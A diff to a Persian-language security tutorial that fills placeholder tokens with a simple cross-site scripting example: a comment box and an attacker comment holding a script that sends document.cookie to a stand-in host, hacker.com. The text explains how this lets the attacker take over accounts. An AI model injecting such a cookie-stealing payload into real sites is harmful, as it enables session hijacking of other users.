@@ -33,15 +33,14 @@ sources:
 ### مثال <span dir="ltr">XSS</span>:
 
 فرض کن یه سایت داری که کامنت می‌گیره و نمایش می‌ده:
-```__PROTECTED_12__
-<__PROTECTED_13__>نظر کاربر: [کامنت کاربر]</__PROTECTED_14__>
+```html
+<div>نظر کاربر: [کامنت کاربر]</div>
 ```
 
 هکر کامنت می‌ذاره:
-```__PROTECTED_15__
-<__PROTECTED_16__>__PROTECTED_17__.__PROTECTED_18__='__PROTECTED_19__://__PROTECTED_20__.__PROTECTED_21__/__PROTECTED_22__?__PROTECTED_23__='+__PROTECTED_24__.__PROTECTED_25__</__PROTECTED_26__>
+```html
+<script>document.location='https://hacker.com/steal?cookie='+document.cookie</script>
 ```
-
 وقتی کاربر دیگه صفحه رو باز می‌کنه، این کد اجرا می‌شه و کوکی کاربر فرستاده می‌شه به هکر! هکر با کوکی می‌تونه وارد اکانت کاربر بشه.
 
 ### چرا برای امنیت مهمه؟
